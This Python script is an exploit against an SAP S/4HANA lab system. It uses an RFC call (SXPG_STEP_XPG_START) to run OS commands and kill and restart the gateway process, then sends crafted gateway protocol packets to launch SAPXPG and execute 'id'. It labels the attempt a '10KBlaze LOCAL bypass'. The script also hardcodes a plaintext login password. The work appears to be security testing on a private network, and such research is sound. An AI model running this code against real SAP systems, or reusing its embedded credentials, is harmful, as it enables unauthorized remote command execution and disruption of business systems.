#!/usr/bin/env python3
"""
kill_restart_gwrd.py — Kill gwrd (PID 25642) and wait for sapstartsrv to restart it.

gwrd needs to restart to pick up gw/alternative_hostnames = ubuntu from DEFAULT.PFL.
s4hadm owns the gwrd process, so it can kill it.
sapstartsrv automatically restarts gateway processes.
"""
import sys, socket, struct, time
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')

from sap_rfc_ctypes import RFCConnection
from sap_gw_xpg_standalone import (
    build_p1, build_p2, build_p3, build_p4,
    parse_response, ni_send, ni_recv, ni_drain, extract_p4_output,
)

SDK    = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
HOST   = '192.168.2.209'
SYSNR  = '00'
CLIENT = '001'
USER   = 'joris'
PASSWD = 'Schaap123!'

GW_HOST   = '192.168.2.209'
GW_PORT   = 3300
INSTANCE  = '00'
SID       = 'S4H'
HOSTNAME  = 's4hanadev'
KERNEL    = '793_REL'
DEST      = 'T_75'
CLIENT_ID = '000'
COMMAND   = 'id'
TIMEOUT   = 20


def xpg(conn, prog, params, label):
    print(f"[CMD] {label}: {prog} {params[:80]}")
    kw = dict(TARGET='', DESTINATION='', EXTPROG=prog, PARAMS=params,
              STDINCNTL='R', STDOUTCNTL='M', STDERRCNTL='M', TRACECNTL='0',
              TERMCNTL='C', TRACELEVEL='0', LONG_PARAMS='', CONNCNTL='H')
    try:
        try:
            r = conn.call('SXPG_STEP_XPG_START', MXROW=9999, **kw)
        except Exception as e:
            if 'MXROW' in str(e) or 'RFC_INVALID_PARAMETER' in str(e):
                r = conn.call('SXPG_STEP_XPG_START', **kw)
            else:
                print(f'  [RFC error] {e}'); return None
    except Exception as e:
        print(f'  [call failed] {e}'); return None
    log = r.get('LOG', [])
    lines = []
    for row in log:
        line = (row.get('MESSAGE') or row.get('LINE') or row.get('TEXT') or '').rstrip() \
               if isinstance(row, dict) else str(row).rstrip()
        if line:
            print(f'  {line}')
            lines.append(line)
    if not lines:
        print(f'  (no output)')
    return lines


def run_sapxpg():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    try:
        sock.connect((GW_HOST, GW_PORT))
    except Exception as e:
        print(f"[-] Connect failed: {e}"); return False

    local_ip = sock.getsockname()[0]
    print(f"[*] Connected from {local_ip}")

    try:
        ni_send(sock, build_p1(GW_HOST, INSTANCE))
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        for f in frames:
            if parse_response(f)['error']:
                print("[P1] REJECTED"); sock.close(); return False
        print(f"[P1] OK ({len(frames)} frames)")
    except Exception as e:
        print(f"[P1] Error: {e}"); sock.close(); return False

    p2 = build_p2(GW_HOST, DEST, local_ip=local_ip, target_hostname=HOSTNAME)
    ni_send(sock, p2)
    conv_id = None; gw_id = 0
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
        raw = frames[0]
        if len(raw) >= 40:
            appc_rc = struct.unpack("!I", raw[32:36])[0]
            sap_rc  = struct.unpack("!I", raw[36:40])[0]
            print(f"[P2] appc_rc={appc_rc} sap_rc={sap_rc}")
            if appc_rc != 0:
                print(f"[P2] DENIED")
                # Print detailed failure info
                print(f"[P2] appc_rc={appc_rc}: ", end='')
                codes = {4:'CONV_FAILURE', 20:'SECURITY_ERROR', 27:'AUTORIZATION', 22:'PROGRAM_NOT_FOUND'}
                print(codes.get(appc_rc, 'unknown'))
                sock.close(); return False
        for f in frames:
            info = parse_response(f)
            if info['error']:
                print(f"[P2] err: {info.get('error_msg', '')}"); sock.close(); return False
            if info['conv_id'] and not conv_id:
                conv_id = info['conv_id']
            if info.get('gw_id') is not None:
                gw_id = info['gw_id']
        print(f"[P2] OK: conv_id={conv_id!r} gw_id={gw_id}")
    except socket.timeout:
        print("[P2] timeout"); sock.close(); return False

    if not conv_id: conv_id = '0'
    time.sleep(0.3)

    p3 = build_p3(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT_ID, COMMAND, '', gw_id=gw_id)
    ni_send(sock, p3)
    try:
        resp = ni_recv(sock, TIMEOUT)
        frames = [resp] + ni_drain(sock, 1)
    except socket.timeout:
        print("[P3] timeout"); sock.close(); return False

    p3_out = []
    for f in frames:
        info = parse_response(f)
        if info['error']:
            print(f"[P3] err: {info.get('error_msg', '')}"); sock.close(); return False
        p3_out.extend(extract_p4_output(f))

    if p3_out:
        print(f"\n[+] *** SUCCESS (P3) ***")
        for ln in p3_out: print(f"    {ln}")
        sock.close(); return True

    p4 = build_p4(conv_id, GW_HOST, HOSTNAME, SID, INSTANCE,
                  KERNEL, DEST, CLIENT_ID, gw_id=gw_id)
    ni_send(sock, p4)
    try:
        resp = ni_recv(sock, TIMEOUT)
        info = parse_response(resp)
        if info['error']:
            print(f"[P4] err: {info.get('error_msg', '')}"); sock.close(); return False
        output = extract_p4_output(resp)
        if output:
            print(f"\n[+] *** SUCCESS (P4) ***")
            for ln in output: print(f"    {ln}")
            sock.close(); return True
        print("[P4] OK but no output")
    except socket.timeout:
        print("[P4] timeout")

    sock.close()
    return False


def main():
    print("=" * 60)
    print("Kill gwrd → sapstartsrv restart → SAPXPG exploit")
    print("=" * 60)

    with RFCConnection(sdk_path=SDK, ashost=HOST, sysnr=SYSNR,
                       client=CLIENT, user=USER, passwd=PASSWD, lang='EN') as conn:
        print('[+] RFC connected')

        # Step 1: Get current gwrd PID
        lines = xpg(conn, '/usr/sap/S4H/D00/exe/sapcontrol',
                    '-nr 00 -function GetProcessList', 'GetProcessList')
        gwrd_pid = None
        for l in (lines or []):
            if 'gwrd' in l and ',' in l:
                parts = l.split(',')
                if len(parts) >= 7:
                    try:
                        gwrd_pid = int(parts[6].strip())
                    except: pass
        print(f"[*] Current gwrd PID: {gwrd_pid}")

        # Step 2: Kill gwrd with SIGTERM — s4hadm owns it
        if gwrd_pid:
            print(f"\n[*] Sending SIGTERM to gwrd PID {gwrd_pid}...")
            xpg(conn, '/bin/kill', f'-15 {gwrd_pid}', f'SIGTERM to gwrd')
            time.sleep(2)

            # Verify it died
            lines2 = xpg(conn, '/bin/ps', f'-p {gwrd_pid} -o pid=', 'Is old PID still alive?')
            if lines2:
                print(f"[*] gwrd still alive after SIGTERM, trying SIGKILL...")
                xpg(conn, '/bin/kill', f'-9 {gwrd_pid}', f'SIGKILL to gwrd')
                time.sleep(2)
            else:
                print(f"[+] gwrd PID {gwrd_pid} killed successfully")

        # Step 3: Wait for sapstartsrv to restart gwrd
        print("\n[*] Waiting for sapstartsrv to restart gwrd (up to 60s)...")
        new_pid = None
        for attempt in range(12):
            time.sleep(5)
            lines3 = xpg(conn, '/usr/sap/S4H/D00/exe/sapcontrol',
                         '-nr 00 -function GetProcessList', f'GetProcessList (attempt {attempt+1})')
            gwrd_running = False
            for l in (lines3 or []):
                if 'gwrd' in l and ',' in l and 'GREEN' in l:
                    parts = l.split(',')
                    if len(parts) >= 7:
                        try:
                            pid = int(parts[6].strip())
                            if pid != gwrd_pid:
                                new_pid = pid
                                gwrd_running = True
                                print(f"[+] gwrd restarted! New PID={new_pid}")
                                break
                        except: pass
            if gwrd_running:
                break
            if attempt < 11:
                print(f"[*] gwrd not yet GREEN, waiting...")

        if not new_pid:
            print("[-] gwrd did not restart within 60s")
            # Check what's happening
            xpg(conn, '/usr/sap/S4H/D00/exe/sapcontrol',
                '-nr 00 -function GetProcessList', 'Final process list')
            return

        # Step 4: Give gwrd time to fully initialize
        print(f"\n[*] gwrd PID={new_pid} — waiting 15s to fully initialize...")
        time.sleep(15)

        # Step 5: Verify the new parameter is in effect
        print("\n[*] Checking gw/alternative_hostnames in new gwrd...")
        xpg(conn, '/usr/sap/S4H/D00/exe/sapcontrol',
            '-nr 00 -function ParameterValue gw/alternative_hostnames',
            'ParameterValue gw/alternative_hostnames')

        # Step 6: Check gw_log for alternative_hostnames at startup
        xpg(conn, '/usr/bin/grep',
            '-i alternative_hostnames /usr/sap/S4H/D00/work/gw_log-2026-04-11',
            'gw_log: alternative_hostnames')

        # Check startup log for LOCAL addr setup
        xpg(conn, '/usr/bin/tail',
            '-20 /usr/sap/S4H/D00/work/gw_log-2026-04-11',
            'gw_log: last 20 lines')

    # Step 7: Run SAPXPG
    print("\n" + "=" * 60)
    print("[*] Testing SAPXPG from 192.168.2.210 (ubuntu)...")
    print("=" * 60)
    success = run_sapxpg()

    if success:
        print(f"\n[+] *** 10KBlaze LOCAL bypass SUCCEEDED! ***")
        print(f"[+] gw/alternative_hostnames = ubuntu makes 192.168.2.210 LOCAL")
    else:
        print(f"\n[-] SAPXPG still blocked.")
        print(f"    Checking if gw/alternative_hostnames affects LOCAL classification...")


if __name__ == '__main__':
    main()
